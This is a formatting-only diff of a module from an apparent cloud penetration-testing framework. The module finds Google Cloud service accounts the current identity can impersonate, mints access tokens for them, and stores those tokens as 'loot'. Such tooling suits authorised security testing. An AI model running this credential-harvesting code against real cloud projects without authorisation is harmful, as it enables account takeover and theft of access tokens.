@@ -50,12 +50,12 @@ from quantum_mechanic.core.technique import technique
 # ----------------------------------------------------------------
 LOOT_ITEMS_KEY = "findings"
 LOOT_SCHEMA = [
-    ("target_sa",  "target_sa"),
-    ("project",    "project"),
-    ("method",     "method"),
-    ("token",      "token"),
+    ("target_sa", "target_sa"),
+    ("project", "project"),
+    ("method", "method"),
+    ("token", "token"),
     ("expires_at", "expires_at"),
-    ("notes",      None),
+    ("notes", None),
 ]
 
 try:
@@ -203,6 +203,7 @@ def execute(ctx: ExecutionContext) -> dict[str, Any]:
 # Internal helpers
 # ================================================================
 
+
 def _discover(ctx: ExecutionContext, whoami_res: Any) -> list[dict[str, Any]]:
     """Enumerate all SAs the current principal has Token Creator rights on."""
     if resourcemanager_v3 is None or iam_admin_v1 is None:
@@ -236,11 +237,15 @@ def _discover(ctx: ExecutionContext, whoami_res: Any) -> list[dict[str, Any]]:
 
             project_level = False
             for binding in policy.bindings:
-                if binding.role in {
-                    "roles/iam.serviceAccountTokenCreator",
-                    "roles/editor",
-                    "roles/owner",
-                } and member_str in binding.members:
+                if (
+                    binding.role
+                    in {
+                        "roles/iam.serviceAccountTokenCreator",
+                        "roles/editor",
+                        "roles/owner",
+                    }
+                    and member_str in binding.members
+                ):
                     project_level = True
                     break
 
@@ -251,19 +256,21 @@ def _discover(ctx: ExecutionContext, whoami_res: Any) -> list[dict[str, Any]]:
                     try:
                         sa_policy = iam_client.get_iam_policy(request={"resource": sa.name})
                         for binding in sa_policy.bindings:
-                            if binding.role == "roles/iam.serviceAccountTokenCreator":
-                                if member_str in binding.members:
-                                    can_impersonate = True
-                                    break
+                            if (
+                                binding.role == "roles/iam.serviceAccountTokenCreator"
+                                and member_str in binding.members
+                            ):
+                                can_impersonate = True
+                                break
                     except Exception:
                         pass
 
                 if can_impersonate:
                     finding: dict[str, Any] = {
                         "target_sa": sa.email,
-                        "project":   pid,
-                        "method":    "roles/iam.serviceAccountTokenCreator",
-                        "token":     None,
+                        "project": pid,
+                        "method": "roles/iam.serviceAccountTokenCreator",
+                        "token": None,
                         "expires_at": None,
                     }
                     findings.append(finding)
@@ -305,18 +312,19 @@ def _generate_token(ctx: ExecutionContext, sa_email: str) -> dict[str, Any]:
 
         expiry_str = (
             impersonated.expiry.replace(tzinfo=UTC).isoformat()
-            if impersonated.expiry else "unknown"
+            if impersonated.expiry
+            else "unknown"
         )
         ctx.log(f"Token generated for {sa_email} — expires {expiry_str}")
         return {
-            "token":      impersonated.token,
+            "token": impersonated.token,
             "expires_at": expiry_str,
         }
 
     except Exception as e:
         ctx.log(f"GenerateAccessToken failed for {sa_email}: {e}")
         return {
-            "token":      None,
+            "token": None,
             "expires_at": None,
             "token_error": str(e),
         }
